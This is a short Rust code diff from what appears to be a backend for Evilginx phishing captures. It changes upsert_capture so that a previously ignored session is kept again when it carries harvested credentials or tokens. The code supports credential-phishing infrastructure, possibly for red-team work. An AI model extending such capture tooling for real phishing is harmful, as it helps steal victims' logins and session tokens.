@@ -974,8 +974,16 @@ pub fn upsert_capture(
             )
             .optional()?
             .unwrap_or(false);
+        // Stale ignores (same numeric session id reused after a prior prune)
+        // must not hide a later capture that actually has credentials/tokens.
         if ignored {
-            return Ok(());
+            if !capture_has_material(data) {
+                return Ok(());
+            }
+            conn.execute(
+                "DELETE FROM ignored_sessions WHERE profile_id = ?1 AND evilginx_session_id = ?2",
+                params![profile_id, evilginx_session_id],
+            )?;
         }
         let now = now_iso();
         conn.execute(
